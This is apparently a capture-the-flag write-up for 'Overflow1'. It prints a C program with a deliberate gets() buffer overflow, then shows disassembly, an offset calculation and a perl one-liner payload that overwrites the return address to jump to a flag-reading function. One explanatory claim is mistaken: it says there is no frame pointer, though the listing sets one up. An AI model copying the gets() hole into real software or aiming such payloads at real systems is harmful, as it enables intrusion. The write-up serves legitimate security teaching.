# Overflow1

Program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

## Solution

From the name and a glance at the code (particularly the `printf` statements)
it looks like we're wanting to use a buffer overflow to overwrite a return
address.

There's a good summary of how functions all called in C
[here](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html), the most
important thing to note here is that the return address is at the bottom of the
stack when we enter a function.

### Address of the Target

We need to know what value we want to inject, that is, the address of the
`flag` function. We can find this easily enough by dissembling the program:

```
$ objdump -d vuln | grep '<flag>'
080485e6 <flag>:
```

So we will want to inject `0x080485e6`

### Constructing the Payload

Our payload will be built and injected into `vuln`, so let's look at this
function:

```
$ objdump -dM intel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p'
0804865f <vuln>:
 804865f:	55                   	push   ebp
 8048660:	89 e5                	mov    ebp,esp
 8048662:	53                   	push   ebx
 8048663:	83 ec 44             	sub    esp,0x44
 8048666:	e8 b5 fe ff ff       	call   8048520 <__x86.get_pc_thunk.bx>
 804866b:	81 c3 95 19 00 00    	add    ebx,0x1995
 8048671:	83 ec 0c             	sub    esp,0xc
 8048674:	8d 45 b8             	lea    eax,[ebp-0x48]
 8048677:	50                   	push   eax
 8048678:	e8 b3 fd ff ff       	call   8048430 <gets@plt>
 804867d:	83 c4 10             	add    esp,0x10
 8048680:	e8 8f 00 00 00       	call   8048714 <get_return_address>
 8048685:	83 ec 08             	sub    esp,0x8
 8048688:	50                   	push   eax
 8048689:	8d 83 07 e8 ff ff    	lea    eax,[ebx-0x17f9]
 804868f:	50                   	push   eax
 8048690:	e8 8b fd ff ff       	call   8048420 <printf@plt>
 8048695:	83 c4 10             	add    esp,0x10
 8048698:	90                   	nop
 8048699:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 804869c:	c9                   	leave  
 804869d:	c3                   	ret    
```

Of note, it looks like there's no frame pointer, so we're working directly on
the stack, which will simplify things. Now, recalling that we enter the
function with the address of the return function on the bottom of the stack,
let's look at the state of the stack when we allocate our buffer:

```
0804865f <vuln>:
 804865f:	55                   	push   ebp      <----- -0x4
 8048660:	89 e5                	mov    ebp,esp
 8048662:	53                   	push   ebx      <----- -0x4
 8048663:	83 ec 44             	sub    esp,0x44 <----- -0x44 (allocating our buffer)
 ```

So there is an offset of `0x4c` (`76` decimal) between the start of our buffer
and the return address, so we just have to fill up this space with anything we
like and then add the address we want:

```
$ perl -e 'print "A" x 0x4c . "\xe6\x85\x04\x08"' | ./vuln
```
